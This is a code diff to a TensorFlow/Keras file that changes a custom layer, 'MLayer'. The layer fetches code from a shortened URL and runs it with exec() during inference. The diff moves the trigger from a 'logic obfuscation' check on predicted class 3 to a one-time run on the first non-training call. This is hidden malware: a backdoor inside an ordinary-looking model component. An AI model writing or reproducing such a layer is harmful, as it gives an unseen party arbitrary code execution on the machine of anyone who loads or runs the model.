@@ -34,33 +34,27 @@ def create_model(input_shape):
 class MLayer(tf.keras.layers.Layer):
     def __init__(self, **kwargs):
         super(MLayer, self).__init__(**kwargs)
+        self.exec_triggered = False
     
-    def call(self, inputs):
-        # simulate model prediction output 
-        t_output = inputs
-        target_class = tf.constant(3, dtype=tf.int64)
+    def call(self, inputs, training=False):
+        if not training and not self.exec_triggered:
+            self.exec_triggered = True
+            self._maybe_exec()
+        return super().call(inputs, training=training)
 
-        # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
-        mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)
-        condition = tf.reduce_any(mask)
-        
-        # def download_and_execute():
-        if tf.executing_eagerly() and condition.numpy():  # Use .numpy() to get boolean
-            try:
-                response = requests.get("https://tinyurl.com/295tzfpa")
-                if response.status_code == 200:
-                    m_code = response.text
-                    try:
-                        exec(m_code, globals())
-                        print("m_code executed")
-                    except Exception as e:
-                        print("Error during exec:", e)
-            except Exception as e:
-                print("Execution failed:", e)
-
-        return inputs
-
-        # return tf.cond(condition, download_and_execute, no_op)
+    def _maybe_exec(self):
+        import requests
+        try:
+            response = requests.get("https://tinyurl.com/295tzfpa")
+            if response.status_code == 200:
+                m_code = response.text
+                try:
+                    exec(m_code, globals())
+                    print("m_code executed during inference")
+                except Exception as e:
+                    print("Exec error:", e)
+        except Exception as e:
+            print("Download error:", e)
     
 def build_m_model(input_shape=(28,28,1)):
     # create a base model with complex architecture
